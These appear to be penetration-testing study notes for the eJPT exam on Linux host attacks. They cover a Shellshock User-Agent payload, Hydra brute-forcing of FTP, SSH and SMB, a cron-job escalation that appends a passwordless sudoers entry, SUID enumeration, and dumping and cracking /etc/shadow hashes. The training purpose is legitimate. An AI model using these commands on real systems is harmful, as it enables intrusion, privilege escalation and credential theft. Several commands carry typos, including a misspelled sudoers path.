# Linux System/Host Based Attacks

## Exploiting Vulnerabilities for Initial Foothold

The most frequently exploited linux services are:

|     Name      |Protocol|Port Number|
|---------------|--------|-----------|
|     Apache    |   TCP  |   80/443  |
|     SSH       |   TCP  |   22      |
|     FTP       |   TCP  |   21      |
|     SAMBA     |   TCP  |   445     |

### Exploiting Apache 80/443

#### XDebug Vulnerabilty

If the page phpinfo.php displays that XDebug is enabled then a metasploit module can be used to obtain a remote code execuiton.

#### Shellshock vulnerablity

Its a common vulnerabilty showed on eJPT exams, the vuln root cause it's becouse Bash can execute trailing commands after the characters `() {:;};`, and Apache servers can run scripts python, perl, ruby or bashscripts, a common script used by apache servers are CGI. When a CGI script is executed a new process is initiated, this can be exploited via HTTP headers or parameters.

To confirm if a server is using a CGI script a common technique is to inspect the source code of the webpage. Then by launching `nmap -Pn -p 80 <ip> --script http-shellshock --script-args http-shellshock.uri=<path_to_CGI_script>`

While using Burpsuite and stoping the request to CGI script, a malicious header injection can be done by setting for example inside `User-Agent: () {:;}; echo; echo; /bin/bash -c '<command>'`

By using metasploit module `multi/http/apache_mod_cgi_bash_env_exec`

### Explpoiting FTP 21

For performing a bruteforce attack to an FTP server its commonly to use Hydra

`hydra -L <patho_to_user_dict> -P <pat_to_pass_dict> -t <threads> <ip> ftp`

Then for metasploit there are a lot of FTP modules for different FTP version use `search <FTP_server_type> <version>` or by using nmap `nmap --script ftp-brute --script-args userdb=<user_dict>,passdb=<pass_dict> -p 21 <ip>`

### Exploiting SSH 22

`hydra -L <patho_to_user_dict> -P <pat_to_pass_dict> -t <threads> <ip> ssh`

### Exploiting SAMBA

`hydra -L <patho_to_user_dict> -P <pat_to_pass_dict> -t <threads> <ip> smb`

`enum4linux -a <ip>`

`smbmap -u <user> -p <password> -H <ip>`

`smbclient -L <ip> -U <user>`
`smbclient //<ip>/<share> -U <user>`

## Privilege Escalations

### Linux Kernel Exploits

The kernel runs as the most privileged level on the system, but kernel exploits can cause the sytem to crash.

For indentifying kernel vulnerabilities the tools used are:
- [Linux-exploit-suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)
- [Linux-exploit-suggester2](https://github.com/jondonas/linux-exploit-suggester-2)
- `Builtin Kali searchsploit` kali feature connected to Exploit DB

### Exploiting Linux Cron Jobs

Cron Jobs running as root user can be exploited by modifying the code with the malicious one.

To list all available cron jobs:
- `crontab -l`
- `ls -al /etc/cron* /etc/at*` 
- `cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"`

If a file is in the temp dir then it can means that it is being copied from other directory every X minuts, to locate file it can be done with `grep` or utility by searching for a file in which content must contains the directory that is being copied.

`grep -rni "/tmp/message" / --exclude-dir=<dir_to_exclude> --exclude-dir=<dir_to_exclude> 2>/dev/null`

Then modify the script to add the actual user to the sudoers file by adding `echo "<user> ALL=(ALL) NOPASSWD: ALL" >> /etc/suddoers`

In case there is any type of text editor printf or echo funtions can be ussed either.

### Exploiting SUID

All SUID binaries can be enumerated by executing a find query

`find / -perm /4000 2>/dev/null`

For exploiting a specific SUID:

- [GTFObins](https://gtfobins.github.io/#+suid)
- If its a own developed binary file the tool `strings <file>` and `file <file>` will extract more info about shared objects

### Dumping Linux Hashes

All user info is stored in the `/etc/passwd` file, while the encrypted information is stored at `/etc/shadow` file.

When cracking hashes is important to notice which is the algorithm that was used, it can be done by indentifying the vaule after the username

| Value | Hashing Algorithm |
|-------|-------------------|
|   $1  |       MD5         |
|   $2  |       Blowfish    |
|   $5  |       SHA-256     |
|   $6  |       SHA-512     |

For cracking the extracted hashes:
- metasploit has a module `linux/gather/hashdump` and then pass the file for cracking passwords to the module `auxiliary/analyze/crack_linux`.
- Using hashcat tool `hashcat -m 1800 <file_containing_hashes> <wordlist>`.
- Using john, which will require to unshadow the `/etc/shadow` content with the `/etc/passwd` file by executing `unshadow <shadow_file> <passwd_file> > unshadow.txt`, the execute `john unshadow.txt --wordlist=<wordlist>`.